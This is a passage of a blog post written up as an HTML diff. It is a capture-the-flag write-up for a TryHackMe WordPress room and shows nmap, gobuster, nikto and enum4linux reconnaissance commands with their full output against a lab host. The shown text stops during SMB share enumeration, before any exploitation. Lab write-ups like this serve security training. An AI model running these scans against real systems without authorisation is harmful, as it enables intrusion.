@@ -1,0 +1,1721 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="THM - Blog" /><meta property="og:locale" content="en" /><meta name="description" content="Blog About The Room Billy Joel made a Wordpress blog! Url: https://tryhackme.com/room/blog Creator: Nameless0ne Difficulty: Medium" /><meta property="og:description" content="Blog About The Room Billy Joel made a Wordpress blog! Url: https://tryhackme.com/room/blog Creator: Nameless0ne Difficulty: Medium" /><link rel="canonical" href="https://xp10i7.github.io/posts/THM-Blog/" /><meta property="og:url" content="https://xp10i7.github.io/posts/THM-Blog/" /><meta property="og:site_name" content="Xp10i7" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-05-01T00:00:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="THM - Blog" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-03T13:56:25+05:30","datePublished":"2022-05-01T00:00:00+05:30","description":"Blog About The Room Billy Joel made a Wordpress blog! Url: https://tryhackme.com/room/blog Creator: Nameless0ne Difficulty: Medium","headline":"THM - Blog","mainEntityOfPage":{"@type":"WebPage","@id":"https://xp10i7.github.io/posts/THM-Blog/"},"url":"https://xp10i7.github.io/posts/THM-Blog/"}</script><title>THM - Blog | Xp10i7</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Xp10i7"><meta name="application-name" content="Xp10i7"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/sample/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Xp10i7</a></div><div class="site-subtitle font-italic">All About Write-Ups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/Xp10i7" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['Xp10i7.github','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>THM - Blog</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>THM - Blog</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1651343400" data-df="ll" data-toggle="tooltip" data-placement="bottom"> May 1, 2022 </em> </span> <span> Updated <em class="" data-ts="1651566385" data-df="ll" data-toggle="tooltip" data-placement="bottom"> May 3, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> 54ny4m Xp10i7 </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="5093 words"> <em>28 min</em> read</span></div></div></div><div class="post-content"><h1 id="blog">Blog</h1><h2 id="about-the-room"><span class="mr-2">About The Room</span><a href="#about-the-room" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><em>Billy Joel made a Wordpress blog!</em><br /></p><ul><li>Url: https://tryhackme.com/room/blog<li>Creator: <a href="https://tryhackme.com/p/Nameless0ne">Nameless0ne</a><li>Difficulty: Medium</ul><h2 id="first-thing-first"><span class="mr-2">First Thing First</span><a href="#first-thing-first" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We should add (IP) blog.thm to our /etc/hosts file, so that it runs smoothly via AWS</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>uber㉿uber<span class="o">)</span>-[~/Desktop/THM/BillyBlog]
+└─<span class="nv">$ </span><span class="nb">cat</span> /etc/hosts | <span class="nb">grep </span>blog
+10.10.43.206    blog.thm
+</pre></table></code></div></div><h2 id="reconnaissance"><span class="mr-2">Reconnaissance</span><a href="#reconnaissance" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="nmap"><span class="mr-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+</pre><td class="rouge-code"><pre>nmap <span class="nt">-v</span> <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.43.206 
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-05-01 17:42 IST
+NSE: Loaded 155 scripts <span class="k">for </span>scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 17:42
+Completed NSE at 17:42, 0.00s elapsed
+Initiating NSE at 17:42
+Completed NSE at 17:42, 0.00s elapsed
+Initiating NSE at 17:42
+Completed NSE at 17:42, 0.00s elapsed
+Initiating Ping Scan at 17:42
+Scanning 10.10.43.206 <span class="o">[</span>2 ports]
+Completed Ping Scan at 17:42, 0.17s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating Connect Scan at 17:42
+Scanning blog.thm <span class="o">(</span>10.10.43.206<span class="o">)</span> <span class="o">[</span>1000 ports]
+Discovered open port 445/tcp on 10.10.43.206
+Discovered open port 139/tcp on 10.10.43.206
+Discovered open port 22/tcp on 10.10.43.206
+Discovered open port 80/tcp on 10.10.43.206
+Increasing send delay <span class="k">for </span>10.10.43.206 from 0 to 5 due to 55 out of 183 dropped probes since last increase.
+Completed Connect Scan at 17:42, 20.72s elapsed <span class="o">(</span>1000 total ports<span class="o">)</span>
+Initiating Service scan at 17:42
+Scanning 4 services on blog.thm <span class="o">(</span>10.10.43.206<span class="o">)</span>
+Completed Service scan at 17:42, 11.70s elapsed <span class="o">(</span>4 services on 1 host<span class="o">)</span>
+NSE: Script scanning 10.10.43.206.
+Initiating NSE at 17:42
+Completed NSE at 17:42, 6.23s elapsed
+Initiating NSE at 17:42
+Completed NSE at 17:42, 0.74s elapsed
+Initiating NSE at 17:42
+Completed NSE at 17:42, 0.00s elapsed
+Nmap scan report <span class="k">for </span>blog.thm <span class="o">(</span>10.10.43.206<span class="o">)</span>
+Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 996 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open  http        Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-generator: WordPress 5.0
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Billy Joel&amp;#039<span class="p">;</span>s IT Blog &amp;#8211<span class="p">;</span> The IT blog
+|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 1 disallowed entry 
+|_/wp-admin/
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+Service Info: Host: BLOG<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-time: 
+|   <span class="nb">date</span>: 2022-05-01T12:12:38
+|_  start_date: N/A
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows 6.1 <span class="o">(</span>Samba 4.7.6-Ubuntu<span class="o">)</span>
+|   Computer name: blog
+|   NetBIOS computer name: BLOG<span class="se">\x</span>00
+|   Domain name: <span class="se">\x</span>00
+|   FQDN: blog
+|_  System <span class="nb">time</span>: 2022-05-01T12:12:38+00:00
+| nbstat: NetBIOS name: BLOG, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
+| Names:
+|   BLOG&lt;00&gt;             Flags: &lt;unique&gt;&lt;active&gt;
+|   BLOG&lt;03&gt;             Flags: &lt;unique&gt;&lt;active&gt;
+|   BLOG&lt;20&gt;             Flags: &lt;unique&gt;&lt;active&gt;
+|   <span class="se">\x</span>01<span class="se">\x</span>02__MSBROWSE__<span class="se">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
+|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
+
+NSE: Script Post-scanning.
+Initiating NSE at 17:42
+Completed NSE at 17:42, 0.00s elapsed
+Initiating NSE at 17:42
+Completed NSE at 17:42, 0.00s elapsed
+Initiating NSE at 17:42
+Completed NSE at 17:42, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>41.07 seconds
+</pre></table></code></div></div><p>oooh, we have port <code class="language-plaintext highlighter-rouge">139</code> open and we now know that the wordpress version being used is 5.0 (vulnerable!). Nice.</p><p>Also, let’s check out port <code class="language-plaintext highlighter-rouge">80</code>, by simply visiting 10.10.43.206.</p><p><img data-src="/assets/Blog/front.png" alt="Front Page" data-proofer-ignore></p><p>On the first glance, there seems nothing of interest, even source code does not have anything juicy as such, it’s just a simple blog. But we do get two names <code class="language-plaintext highlighter-rouge">Billy Joel</code> and <code class="language-plaintext highlighter-rouge">Karen Wheeler</code>. Also, on scrolling down, we are presented with <code class="language-plaintext highlighter-rouge">Log in</code> which, as usual is wordpress’s <code class="language-plaintext highlighter-rouge">wp-login.php</code>.</p><h3 id="gobuster"><span class="mr-2">Gobuster</span><a href="#gobuster" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+</pre><td class="rouge-code"><pre>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.43.206/ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.10.43.206/
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 10
+<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2022/05/01 17:46:56 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/rss                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.43.206/feed/]
+/login                <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://blog.thm/wp-login.php]
+/0                    <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.43.206/0/]      
+/feed                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.43.206/feed/]   
+/atom                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.43.206/feed/atom/]
+/wp-content           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.43.206/wp-content/]
+/admin                <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://blog.thm/wp-admin/]        
+/rss2                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.43.206/feed/]        
+/wp-includes          <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 318] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.43.206/wp-includes/]
+/rdf                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.43.206/feed/rdf/]     
+/page1                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.43.206/]              
+/<span class="s1">'                    (Status: 301) [Size: 0] [--&gt; http://10.10.43.206/]              
+/dashboard            (Status: 302) [Size: 0] [--&gt; http://blog.thm/wp-admin/]         
+/%20                  (Status: 301) [Size: 0] [--&gt; http://10.10.43.206/]              
+/2020                 (Status: 301) [Size: 0] [--&gt; http://10.10.43.206/2020/]         
+/wp-admin             (Status: 301) [Size: 315] [--&gt; http://10.10.43.206/wp-admin/]   
+</span></pre></table></code></div></div><p>No important info here. Moving on..</p><h3 id="nikto"><span class="mr-2">Nikto</span><a href="#nikto" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+</pre><td class="rouge-code"><pre>nikto <span class="nt">-h</span> 10.10.43.206 
+- Nikto v2.1.6
+<span class="nt">---------------------------------------------------------------------------</span>
++ Target IP:          10.10.43.206
++ Target Hostname:    10.10.43.206
++ Target Port:        80
++ Start Time:         2022-05-01 17:48:09 <span class="o">(</span>GMT5.5<span class="o">)</span>
+<span class="nt">---------------------------------------------------------------------------</span>
++ Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header <span class="s1">'link'</span> found, with contents: &lt;http://blog.thm/wp-json/&gt;<span class="p">;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">"https://api.w.org/"</span>
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="k">in </span>a different fashion to the MIME <span class="nb">type</span>
++ No CGI Directories found <span class="o">(</span>use <span class="s1">'-C all'</span> to force check all possible <span class="nb">dirs</span><span class="o">)</span>
++ Entry <span class="s1">'/wp-admin/'</span> <span class="k">in </span>robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>302<span class="o">)</span>
++ <span class="s2">"robots.txt"</span> contains 2 entries which should be manually viewed.
++ Apache/2.4.29 appears to be outdated <span class="o">(</span>current is at least Apache/2.4.37<span class="o">)</span><span class="nb">.</span> Apache 2.2.34 is the EOL <span class="k">for </span>the 2.x branch.
++ Web Server returns a valid response with junk HTTP methods, this may cause <span class="nb">false </span>positives.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /wp-links-opml.php: This WordPress script reveals the installed version.
++ OSVDB-3092: /license.txt: License file found may identify site software.
++ /wp-app.log: Wordpress<span class="s1">' wp-app.log may leak application/system details.
++ /wordpresswp-app.log: Wordpress'</span> wp-app.log may leak application/system details.
++ /: A Wordpress installation was found.
++ /wordpress: A Wordpress installation was found.
++ Cookie wordpress_test_cookie created without the httponly flag
++ OSVDB-3268: /wp-content/uploads/: Directory indexing found.
++ /wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information
++ /wp-admin/wp-login.php: Wordpress login found
++ /wordpresswp-admin/wp-login.php: Wordpress login found
++ /blog/wp-login.php: Wordpress login found
++ /wp-login.php: Wordpress login found
++ /wordpresswp-login.php: Wordpress login found
++ 7893 requests: 0 error<span class="o">(</span>s<span class="o">)</span> and 23 item<span class="o">(</span>s<span class="o">)</span> reported on remote host
++ End Time:           2022-05-01 18:29:10 <span class="o">(</span>GMT5.5<span class="o">)</span> <span class="o">(</span>2461 seconds<span class="o">)</span>
+<span class="nt">---------------------------------------------------------------------------</span>
++ 1 host<span class="o">(</span>s<span class="o">)</span> tested
+</pre></table></code></div></div><p>Moving on again..</p><h3 id="enum4linux"><span class="mr-2">Enum4linux</span><a href="#enum4linux" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Enum4linux is a tool for enumerating information from Windows and Samba systems.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+</pre><td class="rouge-code"><pre>enum4linux 10.10.43.206 
+Starting enum4linux v0.9.1 <span class="o">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span class="o">)</span>
+
+ <span class="o">=========================================(</span> Target Information <span class="o">)=========================================</span>
+
+Target ........... 10.10.43.206
+RID Range ........ 500-550,1000-1050
+Username ......... <span class="s1">''</span>
+Password ......... <span class="s1">''</span>
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ <span class="o">============================(</span> Enumerating Workgroup/Domain on 10.10.43.206 <span class="o">)============================</span>
+
+
+<span class="o">[</span>+] Got domain/workgroup name: WORKGROUP
+
+
+ <span class="o">================================(</span> Nbtstat Information <span class="k">for </span>10.10.43.206 <span class="o">)================================</span>
+
+Looking up status of 10.10.43.206
+        BLOG            &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
+        BLOG            &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service
+        BLOG            &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service
+        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser
+        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name
+        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser
+        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections
+
+        MAC Address <span class="o">=</span> 00-00-00-00-00-00
+
+ <span class="o">===================================(</span> Session Check on 10.10.43.206 <span class="o">)===================================</span>
+
+
+<span class="o">[</span>+] Server 10.10.43.206 allows sessions using username <span class="s1">''</span>, password <span class="s1">''</span>
+
+
+ <span class="o">================================(</span> Getting domain SID <span class="k">for </span>10.10.43.206 <span class="o">)================================</span>
+
+Domain Name: WORKGROUP
+Domain Sid: <span class="o">(</span>NULL SID<span class="o">)</span>
+
+<span class="o">[</span>+] Can<span class="s1">'t determine if host is part of domain or part of a workgroup
+
+
+ ===================================( OS information on 10.10.43.206 )===================================
+
+
+[E] Can'</span>t get OS info with smbclient
+
+
+<span class="o">[</span>+] Got OS info <span class="k">for </span>10.10.43.206 from srvinfo: 
+        BLOG           Wk Sv PrQ Unx NT SNT blog server <span class="o">(</span>Samba, Ubuntu<span class="o">)</span>
+        platform_id     :       500
+        os version      :       6.1
+        server <span class="nb">type</span>     :       0x809a03
+
+
+ <span class="o">=======================================(</span> Users on 10.10.43.206 <span class="o">)=======================================</span>
+
+Use of uninitialized value <span class="nv">$users</span> <span class="k">in </span>print at ./enum4linux.pl line 972.
+Use of uninitialized value <span class="nv">$users</span> <span class="k">in </span>pattern match <span class="o">(</span>m//<span class="o">)</span> at ./enum4linux.pl line 975.
+
+Use of uninitialized value <span class="nv">$users</span> <span class="k">in </span>print at ./enum4linux.pl line 986.
+Use of uninitialized value <span class="nv">$users</span> <span class="k">in </span>pattern match <span class="o">(</span>m//<span class="o">)</span> at ./enum4linux.pl line 988.
+
+ <span class="o">=================================(</span> Share Enumeration on 10.10.43.206 <span class="o">)=================================</span>
+
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+        print<span class="nv">$ </span>         Disk      Printer Drivers
